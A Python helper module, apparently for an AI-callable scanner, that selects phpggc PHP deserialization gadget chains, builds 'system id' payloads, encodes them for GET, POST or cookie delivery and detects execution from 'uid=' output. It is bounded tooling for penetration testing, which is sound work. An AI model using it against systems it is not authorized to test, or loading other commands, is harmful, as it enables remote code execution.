"""
Pure parsing, gadget-chain selection, payload encoding, and response
signature detection for phpggc. No I/O or network requests here.

A result only counts as confirmed when the fixed `id` command's real
output ("uid=... gid=...") comes back in the response, never on a bare
200 or on echoed input.
"""
from __future__ import annotations

import base64
import re
import urllib.parse
from dataclasses import dataclass
from typing import Any, Dict, List, Optional, Tuple

# The one command this tool runs. Deliberately not a model-facing
# parameter: confirmation is the only purpose of the call, so the
# payload's blast radius stays fixed regardless of what the model asks.
DEFAULT_COMMAND = "id"

# Framework alias -> a chain that exists in phpggc's current catalog and
# is a "RCE: Function Call" chain (so `system id` is a valid invocation).
FRAMEWORK_GADGET_CHAINS: Dict[str, str] = {
    "laravel": "Laravel/RCE1",
    "symfony": "Symfony/RCE4",
    "monolog": "Monolog/RCE1",
    "guzzle": "Guzzle/RCE1",
}

DEFAULT_GADGET_CHAIN = "Laravel/RCE1"

SUPPORTED_METHODS: Tuple[str, ...] = ("GET", "POST", "COOKIE")

# An exact chain name, e.g. "Laravel/RCE22" or "Drupal/PsySH/INFO1".
# Anchored and character-bounded so a value can never be read as a
# phpggc CLI flag (e.g. "--help") when it becomes an argv element.
_EXACT_CHAIN_RE = re.compile(r"^[A-Za-z0-9_.-]+(?:/[A-Za-z0-9_.-]+)+$")

_ID_REGEX = re.compile(r"uid=\d+\([^)]+\)\s+gid=\d+", re.IGNORECASE)


@dataclass
class RawPhpggcResult:
    target: str = ""
    parameter: str = ""
    method: str = "GET"
    framework: str = ""
    gadget: str = ""
    payload_b64: str = ""
    status_code: int = 0
    response_body: str = ""
    error: Optional[str] = None


def normalize_target_url(target: str) -> str:
    """Normalize target to a full URL, defaulting to http://."""
    target = target.strip()
    if not target:
        return ""
    if target.startswith("http://") or target.startswith("https://"):
        return target
    return f"http://{target}"


def parse_host_port(target: str) -> Tuple[str, int]:
    """Extract host and port from a target URL or bare host."""
    parsed = urllib.parse.urlsplit(target if "://" in target else f"//{target}")
    host = parsed.hostname or target
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    return host, port


def normalize_method(method: str) -> Tuple[str, Optional[str]]:
    """Upper-case and validate the delivery method."""
    normalized = (method or "GET").strip().upper()
    if normalized not in SUPPORTED_METHODS:
        return "", (
            f"unsupported method {method!r} -- use one of "
            f"{', '.join(SUPPORTED_METHODS)}"
        )
    return normalized, None


def select_gadget_chain(framework: str = "") -> Tuple[str, Optional[str]]:
    """Resolve `framework` to a phpggc gadget-chain name.

    Accepts a known framework alias ("laravel", "symfony", "monolog",
    "guzzle"), an exact phpggc chain name ("Laravel/RCE22"), or nothing
    (default chain). An unknown value is an error, never a silent
    fallback to a different library's chain: a mismatched chain fails
    silently on the target and would look like a clean result.
    """
    value = (framework or "").strip()
    if not value:
        return DEFAULT_GADGET_CHAIN, None

    lowered = value.lower()
    if lowered in FRAMEWORK_GADGET_CHAINS:
        return FRAMEWORK_GADGET_CHAINS[lowered], None

    if _EXACT_CHAIN_RE.match(value):
        return value, None

    return "", (
        f"unknown framework {framework!r} -- use one of "
        f"{', '.join(sorted(FRAMEWORK_GADGET_CHAINS))} or an exact phpggc "
        f"chain name such as 'Laravel/RCE22'"
    )


def build_phpggc_argv(
    script_path: str,
    gadget_chain: str,
    command: str = DEFAULT_COMMAND,
) -> List[str]:
    """Exact argv for phpggc's function-call invocation.

    `system <command>` is phpggc's syntax for "RCE: Function Call"
    chains; the command itself is capped so the generated payload stays
    bounded even if a caller passes something long.
    """
    clean_command = (command or DEFAULT_COMMAND).strip()[:100] or DEFAULT_COMMAND
    return ["php", script_path, gadget_chain, "system", clean_command]


def encode_payload(payload: bytes) -> str:
    """Base64-encode the serialized payload for HTTP delivery.

    Base64 is required: the serialized PHP contains NUL bytes in its
    private/protected property names, which cannot survive a query
    string, form body, or cookie header as raw bytes.
    """
    return base64.b64encode(payload).decode("ascii")


def build_cookie_header(existing_cookie: str, parameter: str, payload_b64: str) -> str:
    """Cookie header carrying the base64 payload, preserving an existing
    session cookie if one was supplied."""
    pair = f"{parameter}={urllib.parse.quote_plus(payload_b64)}"
    existing = (existing_cookie or "").strip().rstrip(";").strip()
    return f"{existing}; {pair}" if existing else pair


def check_confirmation(response_body: str) -> Tuple[bool, str]:
    """True only when the `id` command's real output is in the response.

    An echo of the request, a 200, or a framework error page is not
    execution -- same confirmation idiom php_lfi/fastcgi_exploit use."""
    if not response_body:
        return False, ""

    match = _ID_REGEX.search(response_body)
    if not match:
        return False, ""

    start = max(0, match.start() - 40)
    end = min(len(response_body), match.end() + 120)
    return True, response_body[start:end].strip()


def parse_result(raw: RawPhpggcResult) -> Dict[str, Any]:
    """Transform one raw generation+delivery attempt into the tool result."""
    base: Dict[str, Any] = {
        "target": raw.target,
        "parameter": raw.parameter,
        "method": raw.method,
        "framework": raw.framework or None,
        "gadget": raw.gadget,
        "vulnerable": False,
        "status_code": raw.status_code,
        "snippet": None,
        "payload_chars": len(raw.payload_b64),
        "response_chars": len(raw.response_body),
        "error": raw.error,
    }

    if raw.error:
        return base

    confirmed, snippet = check_confirmation(raw.response_body)
    base["vulnerable"] = confirmed
    base["snippet"] = snippet or None
    return base
